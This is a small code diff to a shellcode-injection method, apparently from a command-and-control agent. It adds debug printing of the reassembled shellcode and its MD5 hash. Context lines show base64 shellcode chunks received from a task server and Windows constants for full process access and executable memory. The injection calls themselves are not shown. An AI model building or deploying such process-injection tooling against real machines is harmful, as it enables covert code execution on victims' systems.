@@ -1,5 +1,6 @@
     def shinject(self, task_id, shellcode, process_id):
         from ctypes import windll,c_int,byref,c_ulong
+        from hashlib import md5
         from base64 import b64decode
         total_chunks = 1
         chunk_num = 0
@@ -17,7 +18,8 @@
             total_chunks = chunk["total_chunks"]
             sc+=b64decode(chunk["chunk_data"])
 
-        print(sc[:100])
+        print(sc[:300])
+        print(md5(sc).hexdigest())
 
         PAGE_EXECUTE_READWRITE = 0x00000040
         PROCESS_ALL_ACCESS = ( 0x000F0000 | 0x00100000 | 0xFFF )
